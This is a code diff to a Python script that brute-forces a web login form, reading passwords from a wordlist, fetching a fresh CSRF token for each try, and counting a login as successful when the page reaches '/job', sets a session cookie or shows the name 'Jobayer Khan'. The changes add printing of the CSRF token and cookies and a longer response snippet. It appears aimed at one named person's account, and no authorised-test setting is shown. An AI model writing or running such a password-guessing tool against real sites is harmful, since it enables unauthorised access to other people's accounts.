@@ -20,6 +20,7 @@ with open(wordlist) as f:
                 print("[-] CSRF token not found. Skipping...")
                 continue
             csrf = m.group(1)
+            print(f"[+] CSRF Token: {csrf}")
         except Exception as e:
             print(f"[!] Token request failed: {e}")
             continue
@@ -34,16 +35,16 @@ with open(wordlist) as f:
         try:
             resp = session.post(url, data=data, allow_redirects=True, timeout=10)
             print(f"Status: {resp.status_code}, Final URL: {resp.url}")
+            print("Cookies:", session.cookies.get_dict())
 
-            # সফল লগইন চেক: URL, cookies, বা নাম দিয়ে
-            cookies = session.cookies.get_dict()
-            if resp.url.endswith("/job") or "session" in cookies or "Jobayer Khan" in resp.text:
+            # সফল লগইন চেক
+            if resp.url.endswith("/job") or "session" in session.cookies.get_dict() or "Jobayer Khan" in resp.text:
                 print(f"[✅] Valid password found: {pwd}")
                 break
             else:
                 print(f"[-] Invalid: {pwd}")
-                snippet = resp.text[:200].replace("\n", " ")
-                print("[Snippet]:", snippet)
+                snippet = resp.text[:300].replace("\n", " ")
+                print("[Snippet]:", snippet[:300])
 
         except Exception as e:
             print(f"[!] Exception: {e}")
